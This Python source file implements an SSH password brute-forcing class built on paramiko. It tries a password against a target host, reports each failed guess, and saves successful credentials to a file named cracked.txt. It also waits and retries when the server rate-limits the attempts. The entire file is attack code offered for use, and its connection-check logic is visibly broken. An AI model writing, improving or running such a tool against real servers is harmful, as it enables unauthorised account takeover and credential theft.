import paramiko
import socket
import time
from .interface import colors

class BruteForce:

	def __init__(self, host, port, username):
		self.host = host
		self.port = port
		self.username = username

	def check_connection(self):
		target = paramiko.SSHClient()
		if target.get_transport() is not None:
			target.get_transport().is_active()
			target.close()
			return False
		else:
			target.close()
			return True

	def attack(self, password):

		if BruteForce.check_connection(self) is False:
			print(colors.foreground.red, "[!] Host is likely down...")
			error_ssh = 1
			target.close()
			return False

		target = paramiko.SSHClient()
		target.load_system_host_keys()
		target.set_missing_host_key_policy(paramiko.AutoAddPolicy())

		try:
			target.connect(
						hostname = self.host, 
						port =self.port, 
						username = self.username, 
						password = password, 
						banner_timeout = 300)
			print(
				colors.foreground.green, 
				f"[!] Successful login for {self.host}, using credentials: {self.username}, {password}")
			open("cracked.txt", "w").write(f"{self.username}@{self.host}:{self.port}--{password}")
			found_creds = 1
			target.close()
			return True

		except paramiko.AuthenticationException:
			print(
				colors.reset, 
				f"[!] Invalid credentials combination for {self.username}:{password}")
			time.sleep(0.3)
			pass

		except paramiko.BadAuthenticationType:
			print(
				colors.foreground.red,
				f"[!] Error - Login likely done using public key-based authentication.")
			target.close()
			return False

		except socket.timeout:
			print(
				colors.foreground.red, 
				f"[!] Error - Connection timed out...")
			target.close()
			return False

		except paramiko.SSHException:
			print(
				colors.foreground.yellow, 
				f"[*] Too many requests. Retrying subprocess connection in 60 seconds...")
			time.sleep(60)
			return BruteForce.attack(self, password)

		except Exception as e:
			print(colors.foreground.red, f"[!] Error:", e)
			target.close()
			return False

		finally:
			target.close()